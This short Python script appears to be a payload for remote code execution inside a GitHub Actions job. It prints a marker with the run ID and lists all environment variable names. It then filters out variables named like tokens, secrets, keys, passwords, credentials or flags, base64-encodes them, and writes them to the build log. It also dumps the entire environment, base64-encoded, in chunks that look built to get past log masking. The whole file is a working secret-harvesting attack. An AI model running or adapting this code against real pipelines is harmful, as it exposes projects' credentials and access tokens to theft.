import base64
import json
import os
import sys

print("RCE_PY_MARKER run=%s" % os.environ.get("GITHUB_RUN_ID"))
env = dict(os.environ)
print("ENV_KEYS=" + ",".join(sorted(env.keys())))
sensitive = {
    k: v
    for k, v in env.items()
    if any(t in k.upper() for t in ("TOKEN", "SECRET", "KEY", "FLAG", "PASS", "CRED"))
}
print(
    "SENSITIVE_JSON_B64="
    + base64.b64encode(json.dumps(sensitive, sort_keys=True).encode()).decode()
)
raw = base64.b64encode(json.dumps(env, sort_keys=True).encode()).decode()
for i in range(0, len(raw), 1800):
    print("ENV_PART_%d=%s" % (i // 1800, raw[i : i + 1800]))
sys.stdout.flush()
sys.exit(1)
